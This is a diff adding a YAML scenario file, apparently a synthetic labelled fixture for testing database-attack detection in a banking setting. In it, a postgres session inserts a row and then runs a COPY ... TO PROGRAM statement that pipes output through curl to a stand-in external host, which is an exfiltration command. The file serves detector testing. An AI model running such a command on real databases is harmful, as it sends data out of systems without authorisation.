@@ -1,0 +1,23 @@
+scenario_id: gen_banking_13_data_tamper_mal_281
+family_id: gen_banking_13_data_tamper_mal_fam281
+domain: banking
+time_of_day: 00:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: INSERT INTO transactions DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.10.19.215
+      port: 8080
